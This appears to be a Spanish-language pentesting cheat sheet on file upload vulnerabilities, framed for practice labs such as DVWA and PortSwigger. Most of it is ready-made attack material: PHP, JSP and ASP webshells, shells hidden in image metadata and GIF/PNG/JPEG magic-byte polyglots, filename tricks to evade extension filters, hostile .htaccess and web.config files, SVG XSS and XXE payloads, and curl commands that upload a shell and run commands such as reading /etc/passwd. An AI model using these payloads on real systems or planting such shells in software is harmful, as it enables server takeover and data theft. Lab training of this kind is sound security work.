<div align="center">

# 📤 File Upload
### Bypass de Validaciones y Subida de Archivos Maliciosos

![Status](https://img.shields.io/badge/Status-Active-ff3c6e?style=for-the-badge&logo=statuspage&logoColor=white)
![Category](https://img.shields.io/badge/Category-File%20Upload-00d4ff?style=for-the-badge&logo=owasp&logoColor=white)
![Tool](https://img.shields.io/badge/Main%20Tool-Caido-00ff88?style=for-the-badge)

</div>

---

> **File Upload:** la app acepta archivos sin validar correctamente el tipo, nombre, contenido o path de almacenamiento. El impacto más crítico es subir un script ejecutable (webshell) a un directorio con permisos de ejecución → Remote Code Execution. Validaciones: extensión (whitelist/blacklist), MIME/Content-Type, magic bytes, configuración del servidor — cada una bypasseable independientemente.

> [!WARNING]
> **Aviso Legal y Ético:** Uso exclusivo en entornos con **autorización explícita por escrito (RoE).** El uso no autorizado constituye un delito penal.

---

## 📑 Tabla de Contenidos

| # | Sección |
|---|---------|
| 01 | [🎯 Labs Objetivo](#-labs-objetivo) |
| 02 | [🛠️ Herramientas](#️-herramientas) |
| 03 | [🔍 Qué Revisar](#-qué-revisar) |
| 04 | [🧪 Webshells](#-webshells) |
| 05 | [🧱 Bypass de Extensión](#-bypass-de-extensión) |
| 06 | [🛡️ Bypass de MIME y Magic Bytes](#️-bypass-de-mime-y-magic-bytes) |
| 07 | [🔁 Flujo con Caido](#-flujo-con-caido) |
| 08 | [⚙️ Comandos Útiles](#️-comandos-útiles) |
| 09 | [🧠 Bypass Típico en Labs](#-bypass-típico-en-labs) |
| 10 | [🧭 Ruta de Práctica](#-ruta-de-práctica) |
| 11 | [📝 Checklist](#-checklist) |

---

## 🎯 Labs Objetivo

| Plataforma | Labs recomendados |
|-----------|-------------------|
| **DVWA** | File Upload |
| **Juice Shop** | Upload Type, Upload Size |
| **PortSwigger** | File upload vulnerabilities |

---

## 🛠️ Herramientas

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-curl-00d4ff?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-exiftool-ff6b00?style=flat-square)

| Herramienta | Uso |
|-------------|-----|
| **Caido** | `HTTP History`, `Replay` — interceptar y modificar multipart |
| **curl** | Subida directa con MIME falsificado |
| **ffuf** | Fuzzing de extensiones aceptadas |
| **exiftool** | Insertar payload PHP en metadata de imagen |

---

## 🔍 Qué Revisar

![Context](https://img.shields.io/badge/Análisis-Validaciones-ff6b00?style=flat-square)

### `[01]` Controles a identificar

- extensión permitida (whitelist / blacklist)
- `Content-Type` validado server-side vs client-side
- nombre de archivo sanitizado
- ruta final de acceso al archivo subido
- tamaño máximo

### `[02]` Diferencia clave

> [!IMPORTANT]
> Validación client-side (JavaScript) = bypasseable enviando request directo con Caido o curl. Validación server-side = requiere bypass de extensión o MIME.

---

## 🧪 Webshells

![Context](https://img.shields.io/badge/Payload-Webshells-a855f7?style=flat-square)

### `[01]` PHP

```php
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
<?php eval($_POST['code']); ?>
<?=`$_GET[cmd]`?>
<script language="php">system($_GET['c']);</script>
```

### `[02]` PHP — método indirecto (bypass de keywords)

```php
<?php $a=$_POST['a'];$b=$_POST['b'];$a($b); ?>
# Uso: a=system&b=id
```

### `[03]` JSP

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### `[04]` ASP

```asp
<% eval request("cmd") %>
```

### `[05]` Webshell embebido en imagen (exiftool)

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' imagen.jpg
# Subir con extensión .php o si Content-Type no validado
```

---

## 🧱 Bypass de Extensión

![Context](https://img.shields.io/badge/Bypass-Extensiones-ff3c6e?style=flat-square)

### PHP — extensiones alternativas

```text
.php3, .php4, .php5, .php7
.phtml, .phar, .phps, .phtm
.shtml   (SSI)
```

### Doble extensión

```text
shell.php.jpg       (Apache: primera extensión reconocida ejecuta)
shell.jpg.php       (MIME del primero, ejecuta el segundo)
shell.PHP           (case variation)
shell.pHp
shell.php%00.jpg    (null byte — legacy PHP < 5.3.4)
shell.php\x00.jpg
shell.php.          (trailing dot — Windows lo strip)
shell.php%20        (trailing space)
shell.php%0d%0a.jpg (CRLF injection)
shell.php::$DATA    (NTFS Alternate Data Stream)
```

### Caracteres especiales

```text
shell.php/
shell.p\hp
shell%2Ephp         (URL-encoded dot)
shell.....php
```

### Configuración del servidor — .htaccess (Apache)

```apache
AddType application/x-httpd-php .rce
AddHandler php5-script .jpg
```

Subir este archivo como `.htaccess`, luego subir `shell.rce` o `shell.jpg`.

### Configuración del servidor — web.config (IIS)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="php" path="*.php7" verb="*"
           modules="FastCgiModule"
           scriptProcessor="C:\php\php-cgi.exe"
           resourceType="Unspecified"/>
    </handlers>
  </system.webServer>
</configuration>
```

> [!NOTE]
> Probar extensión directa `.php` primero. Si bloqueada → doble extensión → case variation → null byte → extensiones alternativas.

---

## 🛡️ Bypass de MIME y Magic Bytes

![Context](https://img.shields.io/badge/Bypass-MIME%20%26%20Magic%20Bytes-ff6b00?style=flat-square)

### Spoofing de Content-Type

```text
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: text/plain
```

### GIF + PHP shell (magic bytes)

```
GIF89a;
<?php system($_GET['cmd']); ?>
```

Guardar como `shell.php` — tiene magic bytes GIF al inicio pero ejecuta PHP.

### PNG + PHP shell

```
\x89PNG\r\n\x1a\n  [luego payload PHP]
<?php system($_GET['cmd']); ?>
```

### JPEG + PHP shell

```
\xff\xd8\xff  [luego payload PHP]
<?php system($_GET['cmd']); ?>
```

### SVG — XSS via upload

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

### XML — XXE via upload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

> [!TIP]
> Si el servidor valida magic bytes pero no extensión: poner header de imagen real + payload PHP en el body. Renombrar a `.php` en el upload.

---

## 🔁 Flujo con Caido

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)

### `[01]` Subir archivo legítimo

Subir imagen válida. Verificar que la app acepta y devuelve ruta.

### `[02]` Capturar request multipart

`HTTP History` → `Send to Replay`.

### `[03]` Modificar en Replay

Cambiar:

- `filename` en Content-Disposition
- `Content-Type` del part
- contenido del archivo (payload PHP)

### `[04]` Reenviar y verificar

Buscar en response:

- ruta de acceso al archivo subido
- si archivo ejecuta o solo almacena
- mensajes de error del servidor

### `[05]` Acceder al archivo subido

GET al path devuelto con `?cmd=id`:

```bash
curl http://target/uploads/shell.php?cmd=id
```

> [!TIP]
> Si la app no devuelve la ruta, usar `ffuf` para fuzzear paths predecibles: `/uploads/`, `/files/`, `/media/`, `/images/`.

---

## ⚙️ Comandos Útiles

![Tool](https://img.shields.io/badge/Tool-curl-00d4ff?style=flat-square)

```bash
# Subir con MIME falsificado
curl -i -X POST http://target/upload \
  -F "file=@shell.php;type=image/jpeg"

# Verificar ejecución
curl "http://target/uploads/shell.php?cmd=id"
curl "http://target/uploads/shell.php?cmd=cat+/etc/passwd"
```

![Tool](https://img.shields.io/badge/Tool-exiftool-ff6b00?style=flat-square)

```bash
# Incrustar payload en metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' imagen.jpg
cp imagen.jpg shell.php
```

---

## 🧠 Bypass Típico en Labs

| Control | Qué probar |
|---------|------------|
| Solo extensión | doble extensión / case (`shell.php.jpg`, `shell.PHP`) |
| Solo MIME | falsificar `Content-Type: image/jpeg` |
| Validación JavaScript | enviar request directo via Caido/curl |
| Blacklist extensiones | variantes `.phtml`, `.php5`, `.php7` |
| Validación magic bytes | GIF89a header + PHP en body |
| Sin ruta en response | fuzzing de `/uploads/` con ffuf |

---

## 🧭 Ruta de Práctica

1. DVWA File Upload
2. PortSwigger: unrestricted file upload
3. PortSwigger: Content-Type bypass
4. PortSwigger: blacklist bypass
5. Juice Shop: Upload Type / Upload Size

---

## 📝 Checklist

- [ ] request multipart guardado en Caido
- [ ] validación identificada (client-side / server-side)
- [ ] bypass reproducido
- [ ] ruta de acceso al archivo confirmada en lab

---

## 🔗 Referencias

- [PortSwigger File Upload](https://portswigger.net/web-security/file-upload)
- [PayloadsAllTheThings — File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
